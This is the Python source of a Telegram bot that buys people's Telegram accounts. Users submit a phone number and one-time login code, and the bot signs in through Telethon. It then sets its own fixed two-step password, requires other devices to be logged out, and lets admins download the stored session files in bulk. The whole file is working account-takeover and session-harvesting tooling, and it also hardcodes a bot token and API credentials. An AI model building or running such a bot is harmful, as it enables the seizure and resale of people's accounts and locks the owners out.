# -*- coding: utf-8 -*-
import os, time, zipfile, asyncio, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import requests
import telebot
from telebot import types, apihelper
from telethon import TelegramClient, errors, functions

# ================ CONFIG ================
BOT_TOKEN = "8240705831:AAHFvt4Qu3fatlHlbQH7TwX48KuwjpADQnk"
API_ID = 26464635                       # int
API_HASH = "6f56e112e88c84db2017a28eaaef3fcc"
SESSION_FOLDER = "sessions"
NEW_PASSWORD = "83500"

MAIN_CHANNEL = "@Acc_News1"            # বাধ্যতামূলক join (bot-কে admin করুন)
VERIFY_CHANNEL = "@ch286885"           # ভেরিফাই নোটিফিকেশন যাবে এখানে
WITHDRAW_CHANNEL_ID = -1002815538666   # withdraw log

ADMIN_IDS = {7360355314}               # একাধিক এডমিন চাইলে {id1, id2}
VERIFIED_FILE = "verified.json"        # ✅ verified numbers persistence
# =======================================

# Robust timeouts (slow না হওয়ার জন্য)
apihelper.READ_TIMEOUT = 120
apihelper.CONNECT_TIMEOUT = 20
apihelper.SESSION = requests.Session()

os.makedirs(SESSION_FOLDER, exist_ok=True)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", skip_pending=True)

EXEC = ThreadPoolExecutor(max_workers=50)

# =============== STATE ===============
user_data = {}            # chat_id -> {'phone','phone_code_hash','verified','awaiting_done','prompt_msg_id'}
user_balance = {}         # chat_id -> float
user_accounts = {}        # chat_id -> int
user_country_counts = {}  # chat_id -> { 'Malaysia': n, 'Qatar': m, ... }
all_users = set()         # for broadcast, etc.

# ✅ verified phones persistent (load on startup)
if os.path.exists(VERIFIED_FILE):
    try:
        with open(VERIFIED_FILE, "r", encoding="utf-8") as f:
            _loaded = json.load(f)
            verified_phones = set(_loaded if isinstance(_loaded, list) else [])
    except Exception:
        verified_phones = set()
else:
    verified_phones = set()

def save_verified():
    try:
        with open(VERIFIED_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(list(verified_phones)), f, ensure_ascii=False)
    except Exception as e:
        print(f"[save_verified error] {e}")

withdraw_enabled = True

# Country config
allowed_countries = set(["+880"])           # default open
country_price = {"+880": 0.20}              # float
country_flags = {
    "+880": "🇧🇩", "+91": "🇮🇳", "+92": "🇵🇰", "+966": "🇸🇦",
    "+60": "🇲🇾", "+974": "🇶🇦", "+62": "🇮🇩", "+1": "🇺🇸",
    "+44": "🇬🇧", "+81": "🇯🇵", "+82": "🇰🇷", "+86": "🇨🇳"
}
country_names = {
    "+880": "Bangladesh", "+91": "India", "+92": "Pakistan", "+966": "Saudi Arabia",
    "+60": "Malaysia", "+974": "Qatar", "+62": "Indonesia", "+1": "USA",
    "+44": "UK", "+81": "Japan", "+82": "South Korea", "+86": "China"
}
# =====================================

# ============== HELPERS ==============
def now_str():
    return datetime.now().strftime("%Y/%m/%d - %H:%M:%S")

def ensure_user_init(chat_id: int):
    all_users.add(chat_id)
    user_balance[chat_id] = float(user_balance.get(chat_id, 0.0))
    user_accounts[chat_id] = int(user_accounts.get(chat_id, 0))
    user_country_counts.setdefault(chat_id, {})

def is_joined(user_id: int) -> bool:
    # বটকে MAIN_CHANNEL-এ admin করে দিন; না হলে False হবে
    try:
        m = bot.get_chat_member(MAIN_CHANNEL, user_id)
        return m.status in ("member", "administrator", "creator")
    except Exception:
        return False

def join_gate_markup():
    markup = types.InlineKeyboardMarkup()
    join_btn = types.InlineKeyboardButton("🔗 Join Channel", url=f"https://t.me/{MAIN_CHANNEL.replace('@','')}")
    verify_btn = types.InlineKeyboardButton("✅ Verified", callback_data="verify_join")
    markup.add(join_btn)
    markup.add(verify_btn)
    return markup

def show_join_gate(chat_id: int):
    bot.send_message(
        chat_id,
        "🎉 Please join the channel below if you want to use the bot.\n\n"
        "✅ Join the channel and click on the verified option.",
        reply_markup=join_gate_markup()
    )

def require_join(func):
    def wrapper(message, *args, **kwargs):
        if not is_joined(message.chat.id):
            show_join_gate(message.chat.id)
            return
        return func(message, *args, **kwargs)
    return wrapper

def get_prefix(phone: str):
    codes = set(country_flags) | set(country_names) | set(country_price) | set(allowed_countries)
    for code in sorted(list(codes), key=len, reverse=True):
        if phone.startswith(code):
            return code
    return None

def run_coro(coro):
    loop = asyncio.new_event_loop()
    try:
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    finally:
        loop.close()
# =====================================

# ======== TELETHON TASKS (async) ========
async def send_otp(phone: str):
    client = TelegramClient(os.path.join(SESSION_FOLDER, phone), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        return sent.phone_code_hash
    finally:
        # finally তে disconnect রাখায় কোনো exception হলেও কানেকশন পরিষ্কার হবে
        await client.disconnect()

async def login_and_set_2fa(phone: str, code: str, phone_code_hash: str):
    client = TelegramClient(os.path.join(SESSION_FOLDER, phone), API_ID, API_HASH)
    await client.connect()
    try:
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        except errors.PhoneCodeInvalidError:
            raise ValueError("PHONE_CODE_INVALID")
        except errors.SessionPasswordNeededError:
            return "HAS_PASSWORD"
        # 2FA সেট করা
        await client.edit_2fa(new_password=NEW_PASSWORD, hint="secure")
        return "OK"
    finally:
        await client.disconnect()

async def check_authorizations(phone: str) -> int:
    client = TelegramClient(os.path.join(SESSION_FOLDER, phone), API_ID, API_HASH)
    await client.connect()
    try:
        auths = await client(functions.account.GetAuthorizationsRequest())
        return int(len(auths.authorizations))
    finally:
        await client.disconnect()
# =======================================

# ============ JOIN VERIFY BUTTON ============
@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join_button(call):
    if is_joined(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ Verified")
        bot.send_message(
            call.from_user.id,
            "🎉 Welcome to Robot!\n\n"
            "Enter your phone number with the country code.\n"
            "Example: +62xxxxxxx\n\n"
            "Type /cap to see available countries."
        )
    else:
        bot.answer_callback_query(call.id, "❌ Join if you want to use the bot.", show_alert=True)
# ===========================================

# ================== COMMANDS ==================
@bot.message_handler(commands=["start"])
def cmd_start(message):
    if not is_joined(message.chat.id):
        show_join_gate(message.chat.id)
        return
    ensure_user_init(message.chat.id)
    bot.send_message(
        message.chat.id,
        "🎉 Welcome to Robot!\n\n"
        "Enter your phone number with the country code.\n"
        "Example: +62xxxxxxx\n\n"
        "Type /cap to see available countries."
    )

@bot.message_handler(commands=["cap"])
@require_join
def cmd_cap(message):
    ensure_user_init(message.chat.id)
    if not allowed_countries:
        bot.send_message(message.chat.id, "❌ No countries are currently open.")
        return
    lines = []
    for code in sorted(allowed_countries):
        flag = country_flags.get(code, "🌍")
        price = float(country_price.get(code, 0.0))
        lines.append(f"{flag} {code} | 💰 ${price}")
    txt = "📋 Allowed Countries & Price\n\n" + "\n".join(lines) + f"\n\n🌍 Total Countries: {len(allowed_countries)}"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=["balance"])
@require_join
def cmd_balance(message):
    ensure_user_init(message.chat.id)
    bal = float(user_balance.get(message.chat.id, 0.0))
    accs = int(user_accounts.get(message.chat.id, 0))
    report = now_str()

    text = (
        "<b>/balance</b>\n\n"
        "<b>USER INFO</b>\n\n"
        f"👤 User ID: <code>{message.chat.id}</code>\n"
        f"🎰 Accounts: <b>{accs}</b>\n"
        f"💰 Balance: <b>{bal}</b>\n\n"
        f"Report taken on:\n<b>{report}</b>"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💳 Withdraw", callback_data="withdraw_start"))
    bot.send_message(message.chat.id, text, reply_markup=markup)

# ——— /withdraw COMMAND (direct) ———
@bot.message_handler(commands=["withdraw"])
@require_join
def cmd_withdraw(message):
    if not withdraw_enabled:
        bot.send_message(message.chat.id, "❌ Withdrawals are currently disabled.")
        return
    msg = bot.send_message(
        message.chat.id,
        "💳 <b>WITHDRAWAL REQUEST</b>\n\nPlease enter your Leader card/address\n\n"
        "⚠️ Send /cancel to cancel this operation"
    )
    bot.register_next_step_handler(msg, withdraw_collect_address)

# ——— Withdraw from button ———
@bot.callback_query_handler(func=lambda call: call.data == "withdraw_start")
def withdraw_start(call):
    chat_id = call.from_user.id
    if not is_joined(chat_id):
        show_join_gate(chat_id)
        return
    if not withdraw_enabled:
        bot.answer_callback_query(call.id, "❌ Withdrawals are currently disabled.")
        bot.send_message(chat_id, "❌ Withdrawals are currently disabled. Please try again later.")
        return
    bot.answer_callback_query(call.id)
    msg = bot.send_message(
        chat_id,
        "💳 <b>WITHDRAWAL REQUEST</b>\n\nPlease enter your Leader card/address\n\n"
        "⚠️ Send /cancel to cancel this operation"
    )
    bot.register_next_step_handler(msg, withdraw_collect_address)

@bot.message_handler(commands=["cancel"])
def withdraw_cancel(message):
    if not is_joined(message.chat.id):
        show_join_gate(message.chat.id)
        return
    bot.send_message(message.chat.id, "❌ Withdrawal cancelled.")

def withdraw_collect_address(message):
    chat_id = message.chat.id
    if not is_joined(chat_id):
        show_join_gate(chat_id)
        return
    if message.text.strip().lower() == "/cancel":
        bot.send_message(chat_id, "❌ Withdrawal cancelled.")
        return

    address = message.text.strip()
    bal = float(user_balance.get(chat_id, 0.0))
    if bal < 0.10:
        bot.send_message(chat_id, "❌ Minimum withdrawal is $0.10")
        return

    accs = int(user_accounts.get(chat_id, 0))
    cc = user_country_counts.get(chat_id, {})  # {'Bangladesh': x, 'Qatar': y, ...}

    try:
        ui = bot.get_chat(chat_id)
        uname = f"@{ui.username}" if ui and ui.username else "N/A"
    except Exception:
        uname = "N/A"

    report_time = now_str()

    # ✅ Country-wise dynamic lines (flag + country + count), sorted by count desc
    lines = []
    for country, count in sorted(cc.items(), key=lambda kv: kv[1], reverse=True):
        # find code by country name to get flag
        code = None
        for k, v in country_names.items():
            if v == country:
                code = k
                break
        flag = country_flags.get(code or "", "🌍")
        lines.append(f"   ○ {flag} {country}: {count}")
    country_block = "\n".join(lines) if lines else "   ○ No country data"

    # ——— Send full confirmation to the withdraw channel ———
    confirm = (
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "         Withdrawal Confirmation         \n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"• User ID: {chat_id}\n\n"
        f"• Username: {uname}\n\n"
        f"• Balance: {bal}\n\n"
        f"• Address: {address}\n\n"
        f"• Total Accounts: {accs}\n\n"
        f"{country_block}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"           {report_time}         \n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    EXEC.submit(lambda: bot.send_message(WITHDRAW_CHANNEL_ID, confirm))

    # ——— Minimal confirmation to user ———
    bot.send_message(
        chat_id,
        "✅ Your withdrawal request has been sent successfully.\n\n"
        f"💳 Card Name: {address}\n"
        f"⏳ Report taken on: {report_time}"
    )

    # reset balances & account counts AFTER saving
    user_balance[chat_id] = 0.0
    user_accounts[chat_id] = 0
    user_country_counts[chat_id] = {}

# ===== PHONE → OTP → DEVICE CHECK FLOW =====
@bot.message_handler(func=lambda m: m.text and m.text.strip().startswith("+"))
@require_join
def handle_phone_input(message):
    ensure_user_init(message.chat.id)
    phone = message.text.strip()

    if not any(phone.startswith(code) for code in allowed_countries):
        bot.send_message(message.chat.id, "❌ This country is off.")
        return

    # ✅ FIX: already-verified phone দিলে OTP send করবে না (এরর/লগআউট এড়ানো)
    if phone in verified_phones:
        bot.send_message(message.chat.id, "❌ This account has already been verified. Please use a new number.")
        return

    def _send():
        return run_coro(send_otp(phone))
    future = EXEC.submit(_send)
    try:
        phone_code_hash = future.result(timeout=90)
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error sending OTP: {e}")
        return

    user_data[message.chat.id] = {
        "phone": phone,
        "phone_code_hash": phone_code_hash,
        "verified": False,
        "awaiting_done": False,
        "prompt_msg_id": None
    }
    msg = bot.send_message(message.chat.id, "🔢 Enter OTP:")
    bot.register_next_step_handler(msg, verify_otp_code)

def verify_otp_code(message):
    chat_id = message.chat.id
    if chat_id not in user_data:
        bot.send_message(chat_id, "❌ Start again with /start")
        return

    otp = message.text.strip()
    phone = user_data[chat_id]["phone"]
    phone_code_hash = user_data[chat_id]["phone_code_hash"]

    bot.send_message(chat_id, "🔄 Verifying OTP and setting 2FA...")

    def _login():
        return run_coro(login_and_set_2fa(phone, otp, phone_code_hash))
    future = EXEC.submit(_login)
    try:
        result = future.result(timeout=120)
    except Exception as e:
        if "PHONE_CODE_INVALID" in str(e):
            msg = bot.send_message(chat_id, "❌ Incorrect OTP. Try again:")
            bot.register_next_step_handler(msg, verify_otp_code)
            return
        bot.send_message(chat_id, f"⚠️ Error: {e}")
        return

    # If HAS_PASSWORD came, you could handle differently; here we continue to device check
    markup = types.InlineKeyboardMarkup()
    done_btn = types.InlineKeyboardButton("✅ Done", callback_data=f"done_{chat_id}")
    markup.add(done_btn)
    dm = bot.send_message(
        chat_id,
        f"📱 {phone} Device Check\n\nPress ✅ Done after confirming device login.",
        reply_markup=markup
    )
    user_data[chat_id]["awaiting_done"] = True
    user_data[chat_id]["prompt_msg_id"] = dm.message_id

@bot.callback_query_handler(func=lambda call: call.data.startswith("done_"))
def handle_done(call):
    chat_id = int(call.data.split("_")[1])
    if chat_id != call.from_user.id:
        bot.answer_callback_query(call.id, "❌ Not your session.")
        return

    data = user_data.get(chat_id)
    if not data:
        bot.answer_callback_query(call.id, "❌ No active session.")
        return

    if bool(data.get("verified", False)):
        try:
            bot.edit_message_reply_markup(chat_id, data.get("prompt_msg_id"))
        except Exception:
            pass
        bot.answer_callback_query(call.id, "Already verified.")
        return

    phone = data["phone"]

    def _check():
        return run_coro(check_authorizations(phone))
    future = EXEC.submit(_check)
    try:
        sessions = int(future.result(timeout=60))
    except Exception as e:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"❌ Error checking sessions: {e}")
        return

    if sessions > 1:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "❌ Please log out other devices and click Done again.")
        return

    user_data[chat_id]["verified"] = True

    # ✅ persist verified phone immediately
    verified_phones.add(phone)
    save_verified()

    # remove Device Check UI
    try:
        bot.delete_message(chat_id, data.get("prompt_msg_id"))
    except Exception:
        try:
            bot.edit_message_reply_markup(chat_id, data.get("prompt_msg_id"))
        except Exception:
            pass

    prefix = get_prefix(phone) or ""
    amount = float(country_price.get(prefix, 0.0))
    user_balance[chat_id] = float(user_balance.get(chat_id, 0.0)) + amount
    user_accounts[chat_id] = int(user_accounts.get(chat_id, 0)) + 1

    cname = country_names.get(prefix, "Unknown")
    cc = user_country_counts.setdefault(chat_id, {})
    cc[cname] = int(cc.get(cname, 0)) + 1

    bot.answer_callback_query(call.id)
    bot.send_message(chat_id, f"✅ Congratulations, the account {phone} has been successfully verified.")

    # Channel notification
    try:
        ui = bot.get_chat(chat_id)
        uname = f"@{ui.username}" if ui and ui.username else "N/A"
    except Exception:
        uname = "N/A"

    bot.send_message(
        VERIFY_CHANNEL,
        "📢 <b>New Account Verified</b>\n"
        f"👤 User I'd: <code>{chat_id}</code>\n"
        f"🔎 Username: {uname}\n"
        f"📱 Number: <code>{phone}</code>\n"
        f"💰 Receive : <b>{amount}</b>\n"
        f"🕒 Date: <b>{now_str()}</b>"
    )
# ===============================================

# ================== ADMIN PANEL ==================
@bot.message_handler(commands=["adminpanel"])
def admin_panel(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ You are not authorized to use this command.")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🟢 All Session (ZIP)", callback_data="zip_sessions"))
    markup.add(types.InlineKeyboardButton("✅ Verified Sessions (ZIP)", callback_data="zip_verified_sessions"))  # ✅ new
    markup.add(types.InlineKeyboardButton("✂️ Session Delete", callback_data="delete_sessions"))
    markup.add(types.InlineKeyboardButton("🔦 Session Check", callback_data="check_sessions"))
    markup.add(types.InlineKeyboardButton(
        f"{'🟢' if withdraw_enabled else '🔴'} Withdraw {'ON' if withdraw_enabled else 'OFF'}",
        callback_data="toggle_withdraw"
    ))
    markup.add(types.InlineKeyboardButton("➕ Balance Add", callback_data="balance_add"))
    markup.add(types.InlineKeyboardButton("➖ Balance Remove", callback_data="balance_remove"))
    markup.add(types.InlineKeyboardButton("📢 Broadcast", callback_data="broadcast"))
    markup.add(types.InlineKeyboardButton("🌍 Open Country", callback_data="open_country"))
    markup.add(types.InlineKeyboardButton("💰 Price", callback_data="set_price"))
    bot.send_message(message.chat.id, "⚙️ Admin Panel", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in [
    "zip_sessions","zip_verified_sessions","delete_sessions","check_sessions","toggle_withdraw",
    "balance_add","balance_remove","broadcast","open_country","set_price"
])
def admin_buttons(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Unauthorized")
        return

    if call.data == "zip_sessions":
        def _zip_and_send():
            files = [f for f in os.listdir(SESSION_FOLDER) if os.path.isfile(os.path.join(SESSION_FOLDER, f))]
            if not files:
                bot.send_message(call.message.chat.id, "⚠️ No session files found.")
                return
            zip_path = "sessions.zip"
            try:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for f in files:
                        zipf.write(os.path.join(SESSION_FOLDER, f), f)
                with open(zip_path, "rb") as zf:
                    bot.send_document(call.message.chat.id, zf, caption=f"📦 All sessions ({len(files)})")
                bot.send_message(call.message.chat.id, f"✅ Sent {len(files)} sessions.")
            finally:
                if os.path.exists(zip_path):
                    os.remove(zip_path)
        EXEC.submit(_zip_and_send)

    elif call.data == "zip_verified_sessions":
        # ✅ Only sessions for numbers present in verified_phones
        def _zip_verified():
            all_files = [f for f in os.listdir(SESSION_FOLDER) if os.path.isfile(os.path.join(SESSION_FOLDER, f))]
            # match base name without ".session" with verified phone list
            vf = []
            for f in all_files:
                base = f[:-8] if f.endswith(".session") else f
                if base in verified_phones:
                    vf.append(f)
            if not vf:
                bot.send_message(call.message.chat.id, "⚠️ No verified sessions found.")
                return
            zip_path = "verified_sessions.zip"
            try:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for f in vf:
                        zipf.write(os.path.join(SESSION_FOLDER, f), f)
                with open(zip_path, "rb") as zf:
                    bot.send_document(call.message.chat.id, zf, caption=f"✅ Verified sessions ({len(vf)})")
                bot.send_message(call.message.chat.id, f"✅ Sent {len(vf)} verified sessions.")
            finally:
                if os.path.exists(zip_path):
                    os.remove(zip_path)
        EXEC.submit(_zip_verified)

    elif call.data == "delete_sessions":
        def _del():
            files = [f for f in os.listdir(SESSION_FOLDER) if os.path.isfile(os.path.join(SESSION_FOLDER, f))]
            if not files:
                bot.send_message(call.message.chat.id, "⚠️ No session files to delete.")
                return
            deleted = 0
            for f in files:
                try:
                    os.remove(os.path.join(SESSION_FOLDER, f))
                    deleted += 1
                except Exception as e:
                    bot.send_message(call.message.chat.id, f"⚠️ Error deleting {f}: {e}")
            bot.send_message(call.message.chat.id, f"🗑️ Deleted {int(deleted)} session file(s).")
        EXEC.submit(_del)

    elif call.data == "check_sessions":
        msg = bot.send_message(call.message.chat.id, "🔦 Enter how many session files you want to receive:")
        bot.register_next_step_handler(msg, send_limited_sessions)

    elif call.data == "toggle_withdraw":
        global withdraw_enabled
        withdraw_enabled = not bool(withdraw_enabled)
        status = "🟢 Withdraw ON" if withdraw_enabled else "🔴 Withdraw OFF"
        bot.answer_callback_query(call.id, status)
        bot.send_message(call.message.chat.id, f"✅ {status}")

    elif call.data == "balance_add":
        msg = bot.send_message(call.message.chat.id, "➕ Enter <user_id> <amount>  (e.g. 12345 0.5):")
        bot.register_next_step_handler(msg, do_balance_add)

    elif call.data == "balance_remove":
        msg = bot.send_message(call.message.chat.id, "➖ Enter <user_id> <amount>  (e.g. 12345 0.5):")
        bot.register_next_step_handler(msg, do_balance_remove)

    elif call.data == "broadcast":
        msg = bot.send_message(call.message.chat.id, "✍️ Send the message you want to broadcast to all users.")
        bot.register_next_step_handler(msg, do_broadcast)

    elif call.data == "open_country":
        msg = bot.send_message(call.message.chat.id,
            "🌍 Send allowed country codes (each on new line):\n\nExample:\n+880\n+91\n+92\n+966"
        )
        bot.register_next_step_handler(msg, set_countries)

    elif call.data == "set_price":
        msg = bot.send_message(call.message.chat.id,
            "💰 Send country prices (each line: <code>+code price</code>):\n\nExample:\n+880 0.25\n+91 0.35\n+966 1.5"
        )
        bot.register_next_step_handler(msg, set_country_price)

def send_limited_sessions(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ Unauthorized")
        return
    try:
        limit = int(message.text.strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid number. Please enter a valid number.")
        return

    files = [f for f in os.listdir(SESSION_FOLDER) if os.path.isfile(os.path.join(SESSION_FOLDER, f))]
    if not files:
        bot.send_message(message.chat.id, "⚠️ No session files found.")
        return

    def _send(limit_):
        count = 0
        for f in files:
            if count >= int(limit_):
                break
            try:
                with open(os.path.join(SESSION_FOLDER, f), "rb") as fp:
                    bot.send_document(message.chat.id, fp, caption=f"📱 Session: {f}")
                count += 1
            except Exception as e:
                bot.send_message(message.chat.id, f"⚠️ Error sending {f}: {e}")
            time.sleep(0.1)
    EXEC.submit(_send, limit)

def do_balance_add(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ Unauthorized")
        return
    try:
        uid_s, amt_s = message.text.split()
        uid = int(uid_s); amt = float(amt_s)
        ensure_user_init(uid)
        user_balance[uid] = float(user_balance.get(uid, 0.0)) + float(amt)
        bot.send_message(message.chat.id, f"✅ Added {amt} to {uid}. Balance now: {user_balance[uid]}")
        try:
            bot.send_message(uid, f"💰 Admin has added {amt}$ to your balance. New Balance: {user_balance[uid]}$")
        except Exception:
            pass
    except Exception:
        bot.send_message(message.chat.id, "❌ Invalid format. Example: 12345 0.5")

def do_balance_remove(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ Unauthorized")
        return
    try:
        uid_s, amt_s = message.text.split()
        uid = int(uid_s); amt = float(amt_s)
        ensure_user_init(uid)
        user_balance[uid] = max(0.0, float(user_balance.get(uid, 0.0)) - float(amt))
        bot.send_message(message.chat.id, f"✅ Removed {amt} from {uid}. Balance now: {user_balance[uid]}")
        try:
            bot.send_message(uid, f"💰 Admin has removed {amt}$ from your balance. New Balance: {user_balance[uid]}$")
        except Exception:
            pass
    except Exception:
        bot.send_message(message.chat.id, "❌ Invalid format. Example: 12345 0.5")

def do_broadcast(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ Unauthorized")
        return
    text = message.text

    def _bc():
        sent = 0
        for uid in list(all_users):
            try:
                bot.send_message(int(uid), f"📢 Broadcast:\n\n{text}")
                sent += 1
            except Exception:
                pass
            time.sleep(0.03)
        bot.send_message(message.chat.id, f"✅ Broadcast sent to {int(sent)} users.")
    EXEC.submit(_bc)

def set_countries(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ Unauthorized")
        return
    global allowed_countries
    codes = [line.strip() for line in message.text.strip().splitlines() if line.strip().startswith("+")]
    allowed_countries = set(codes)
    if not allowed_countries:
        bot.send_message(message.chat.id, "✅ Allowed Countries Updated: (empty)")
    else:
        bot.send_message(message.chat.id, "✅ Allowed Countries Updated:\n" + "\n".join(sorted(allowed_countries)))

def set_country_price(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "❌ Unauthorized")
        return
    lines = message.text.strip().splitlines()
    updated = []
    for line in lines:
        parts = line.split()
        if len(parts) != 2:
            continue
        code, price = parts[0], parts[1]
        if not code.startswith("+"):
            continue
        try:
            country_price[code] = float(price)
            updated.append((code, float(price)))
        except Exception:
            continue
    if updated:
        summary = "\n".join([f"{country_flags.get(c,'🌍')} {c} → ${float(country_price[c])}" for c,_ in updated])
        bot.send_message(message.chat.id, "✅ Country prices updated:\n" + summary)
    else:
        bot.send_message(message.chat.id, "⚠️ No valid price lines were parsed.")
# ========================================

# ================== RUN ==================
if __name__ == "__main__":
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=50, allowed_updates=["message","callback_query"])
        except Exception as e:
            print(f"[polling error] {e} — retrying in 5s")
            time.sleep(5)
